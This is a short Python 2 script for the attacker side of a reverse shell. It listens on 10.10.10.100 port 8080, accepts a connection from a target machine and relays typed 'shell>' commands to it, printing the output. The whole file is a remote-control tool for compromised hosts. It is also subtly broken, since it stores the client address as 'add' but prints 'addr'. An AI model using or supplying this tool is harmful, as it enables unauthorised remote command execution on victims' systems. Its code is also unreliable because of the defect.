#!/usr/bin/env python


import socket

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.10.10.100", 8080))
	s.listen(1)
	
	print '[+] Listening from incoming connection on port 8080'
	conn, add = s.accept() # accept() function will retuen the connection object ID (conn) and will return the client(target) IP address and source
	
	print '[+] connection from: ', addr

	while True:

		command = raw_input("shell> ")

		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break

		else:
			conn.send(command)
			print conn.recv(1024)
def main():
	connect()
main()
